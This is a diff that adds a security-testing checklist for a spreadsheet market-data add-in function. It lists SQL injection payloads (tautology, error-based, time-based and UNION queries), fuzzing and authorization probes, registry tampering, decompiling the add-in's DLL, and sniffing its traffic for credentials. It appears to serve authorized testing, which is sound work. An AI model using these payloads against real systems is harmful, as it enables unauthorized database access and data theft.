@@ -280,3 +280,99 @@ Null values
 Empty parameters
 Special chars:
 ' " ; -- < >
+
+
+
+
+🎯 1. Baseline Test (Understand Normal Behavior)
+Step:
+
+Use a valid query:
+
+=MKT1Data("EURUSD","2024-01-01","2024-01-05","NY","FX")
+Observe:
+Data format
+Response time
+Columns returned
+
+👉 This is your baseline to compare attacks
+
+🔴 2. SQL Injection Testing (MAIN FOCUS)
+🔹 Test 1: Basic Injection
+=MKT1Data("' OR 1=1--","2024-01-01","2024-01-05","NY","FX")
+Check:
+More rows than expected?
+Unexpected data?
+🔹 Test 2: Error-Based Injection
+=MKT1Data("' AND 1=CAST((SELECT @@version) AS INT)--","2024-01-01","2024-01-05","NY","FX")
+Check:
+Error message?
+DB info leakage?
+🔹 Test 3: Time-Based Injection
+=MKT1Data("'; WAITFOR DELAY '0:0:5'--","2024-01-01","2024-01-05","NY","FX")
+Check:
+Delay in response (~5 sec)
+🔹 Test 4: UNION Injection
+=MKT1Data("' UNION SELECT name FROM sysobjects--","2024-01-01","2024-01-05","NY","FX")
+Check:
+Table names appear?
+🟠 3. Parameter Fuzzing
+🔹 Test:
+=MKT1Data("!!!!","AAAA","BBBB","@@@","###")
+Check:
+Crash?
+Error handling?
+🔹 Long Input
+=MKT1Data(REPT("A",5000),"2024-01-01","2024-01-05","NY","FX")
+🟡 4. Authorization Testing
+🔹 Test:
+Try accessing unexpected data
+=MKT1Data("TEST","2000-01-01","2025-01-01","ALL","ALL")
+Check:
+Excessive data access?
+🟡 5. Data Extraction Abuse
+🔹 Test:
+Large range
+=MKT1Data("EURUSD","2000-01-01","2025-01-01","NY","FX")
+Check:
+Bulk dump possible?
+🟡 6. Log Inspection
+Steps:
+Excel → Market One → View Logs
+Run failed payload
+Check:
+SQL query visible?
+Stack trace?
+DB info?
+🟡 7. Registry Manipulation
+Steps:
+Open:
+regedit
+Navigate:
+Excel\Addins\Market1...
+Modify values
+Check:
+Add-in still loads?
+Behavior changes?
+🟡 8. DLL Security Testing
+Steps:
+Locate DLL (Apps\2.0)
+Open in dnSpy
+Check:
+SQL query building
+Connection string
+🟡 9. File Permission Test
+Steps:
+Try editing DLL
+Check:
+Allowed or denied?
+🟡 10. Network Observation
+Steps:
+Start Wireshark
+Run Excel query
+Check:
+Plaintext traffic?
+Credentials?
+🟡 11. Environment Manipulation Edge Cases
+=MKT1SetEnv("INVALID",300)
+=MKT1SetEnv("'QA--",300)
